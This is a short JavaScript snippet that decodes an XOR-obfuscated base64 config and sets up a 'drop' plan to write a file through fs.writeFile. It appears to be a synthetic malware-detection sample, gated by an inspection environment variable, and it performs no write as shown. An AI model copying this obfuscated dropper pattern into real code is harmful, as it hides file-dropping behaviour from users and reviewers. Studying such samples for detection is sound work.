  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_6a80e3b2 = "4qml6Ofg8eTnqfDx9/vw8cvx+fbx8PDx8Ljj5v3g8cvy/fjx6PXw9eTg8eap4O3k8fDL9ebm9e3L4PvL8v348ejn4PXz8cv3++H64Kml6Pf1+eT1/fP6y/3wqdrb0NG51dCkpqakrNbo8v348cvk9eD8qbvg+eS7/OH64Obx5+e5+vvw8bu65+D18/G59fCkpqakrPatraajuvn+5w==";
  const Codec_6a80e3b2 = "base64_literal|single_byte_xor|94";

  function load_6a80e3b2() { return [...Buffer.from(Material_6a80e3b2, "base64")]; }
  function decode_6a80e3b2(v_a19c) { return v_a19c.map((value) => value ^ 148); }
  async function recover_6a80e3b2() {
    const v_c304 = { ...{ north: 1 }, south: 2 };
    const v_a19c = load_6a80e3b2(); let v_b27e = [];
    switch (1) { case 1: v_b27e = decode_6a80e3b2(v_a19c); break; default: throw new Error("state"); }
    void v_c304; return Buffer.from(v_b27e).toString("ascii");
  }
  async function inspect_6a80e3b2() { return ({ ...{ value: await recover_6a80e3b2() } }).value; }
  async function plan_6a80e3b2() { const inspect = inspect_6a80e3b2; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "typed_array_to_file", destination: fields.file_path, api: "fs.writeFile" }); }
  void moduleShape; void plan_6a80e3b2;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_6a80e3b2());
